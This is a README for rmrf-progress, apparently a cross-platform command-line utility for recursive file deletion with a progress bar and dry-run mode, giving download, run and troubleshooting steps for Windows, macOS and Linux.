# 🎉 rmrf-progress - Quickly Delete Files with Confidence

## 🚀 Getting Started

Welcome to **rmrf-progress**. This tool helps you delete files safely and efficiently while showing you a progress bar. You can use dry-run mode to check what would happen before the actual deletion. 

## 📥 Download & Install

To get started, you need to download the latest version of **rmrf-progress**. Click the link below to visit the download page:

[![Download rmrf-progress](https://img.shields.io/badge/Download-rmrf--progress-brightgreen)](https://github.com/maykol1801/rmrf-progress/releases)

### Step 1: Visit the Releases Page

Go to the [Releases page](https://github.com/maykol1801/rmrf-progress/releases) to find the latest version of the software. 

### Step 2: Choose Your File

On the Releases page, you will see several versions of **rmrf-progress**. Look for the latest release, which is usually at the top. Click on the file that matches your operating system:

- For Windows: **rmrf-progress-windows-amd64.exe**
- For macOS: **rmrf-progress-darwin-amd64**
- For Linux: **rmrf-progress-linux-amd64**

### Step 3: Download the File

Click on the appropriate file to start the download. The download should start automatically. Once it finishes, check your downloads folder.

## 📂 Running the Application

### For Windows Users

1. Open the Command Prompt by typing `cmd` in your Start menu search bar.
2. Navigate to the folder where you downloaded the file using the `cd` command. For example, if you downloaded it to your Downloads folder, type:
   ```bash
   cd Downloads
   ```
3. Type the following command to run the application:
   ```bash
   rmrf-progress-windows-amd64.exe
   ```
   
### For macOS Users

1. Open the Terminal application. You can find it in Applications > Utilities > Terminal.
2. Navigate to your Downloads folder using:
   ```bash
   cd Downloads
   ```
3. Make the file executable with this command:
   ```bash
   chmod +x rmrf-progress-darwin-amd64
   ```
4. Run the application:
   ```bash
   ./rmrf-progress-darwin-amd64
   ```

### For Linux Users

1. Open the Terminal by pressing `Ctrl` + `Alt` + `T`.
2. Go to the Downloads folder:
   ```bash
   cd ~/Downloads
   ```
3. Make the file executable:
   ```bash
   chmod +x rmrf-progress-linux-amd64
   ```
4. Start the application:
   ```bash
   ./rmrf-progress-linux-amd64
   ```

## 🔍 Using rmrf-progress

The application has two modes: regular delete and dry-run mode. 

### Deleting Files

To delete files, simply type the command followed by the path of the file or directory you wish to delete. For example:
```bash
rmrf-progress [path-to-file-or-directory]
```

### Using Dry-Run Mode

If you want to see what would happen without actually deleting anything, you can use dry-run mode. Use the `--dry-run` flag:
```bash
rmrf-progress --dry-run [path-to-file-or-directory]
```
This command will show you what files would be deleted, without making any changes.

## 🛡 Safety Features

The utility has built-in safety features to help protect against accidental deletions. Always run the dry-run mode before making any changes to ensure you’re deleting only what you intend.

### Progress Tracking

One of the standout features of **rmrf-progress** is its progress bar. It shows you how much of the deletion process is complete, giving you a visual representation of progress.

## 🌟 Features Summary

- Recursive file deletion
- Dry-run mode for safe checking
- Progress bar to track your deletion
- Cross-platform support (Windows, macOS, Linux)

## 🛠 Troubleshooting

If you face issues running the application, here are some common solutions:

- **Permission Issues**: Ensure you have the necessary permissions to delete files within the specified directory.
- **File Path**: Make sure you have typed the correct path to the file or directory.
- **Executable Permission**: Ensure the file is executable, especially on macOS and Linux.

## 🌐 Resources

- For more information and updates, visit the [Documentation](https://github.com/maykol1801/rmrf-progress).
- For any issues, you can check the [Issues page](https://github.com/maykol1801/rmrf-progress/issues).

## 📞 Support

For support, feel free to open an issue on the GitHub page. Provide details about your system and the issue you are encountering.

By following these steps, you will be able to download and run **rmrf-progress** with ease. Enjoy smoother file management!